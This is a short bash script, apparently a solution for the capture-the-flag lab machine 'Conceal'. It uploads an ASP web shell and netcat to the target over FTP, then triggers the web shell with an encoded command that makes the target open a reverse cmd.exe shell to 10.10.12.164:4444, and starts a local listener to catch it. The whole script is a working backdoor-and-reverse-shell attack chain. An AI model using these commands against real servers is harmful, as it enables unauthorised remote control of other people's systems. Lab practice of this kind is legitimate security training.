#!/bin/bash

echo "[*] Uploading backdoor"

curl -sT cmd.asp ftp://conceal.htb/

echo "[*] Uploading nc"

curl -sT nc64.exe ftp://conceal.htb/

echo "[*] Spawing shell"

curl -sk "http://conceal.htb/upload/cmd.asp?cmd=C%3A%5Cinetpub%5Cwwwroot%5Cupload%5Cnc64.exe%2010.10.12.164%204444%20-e%20cmd.exe" &

nc -lvp 4444
